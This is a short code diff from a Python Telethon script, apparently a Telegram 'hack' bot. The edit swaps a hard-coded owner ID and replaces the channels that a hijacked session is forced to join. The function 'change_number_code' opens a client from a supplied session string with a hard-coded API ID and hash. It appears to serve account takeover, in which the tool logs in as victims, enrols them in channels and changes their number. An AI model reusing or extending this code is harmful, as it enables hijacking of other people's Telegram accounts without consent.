@@ -22,7 +22,7 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-legendboy = 2024465080
+legendboy = 5272015505
 
 Bot_Username =os.environ.get("BOT_USERNAME", None) or "Hack_OPBot"
 
@@ -30,11 +30,11 @@ async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("@LegendBot_OP"))
+      await bot(join("@team_agora"))
     except BaseException:
       pass
     try:
-      await bot(join("@LegendBot_AI"))
+      await bot(join("@agora_robots"))
     except BaseException:
       pass
     try:
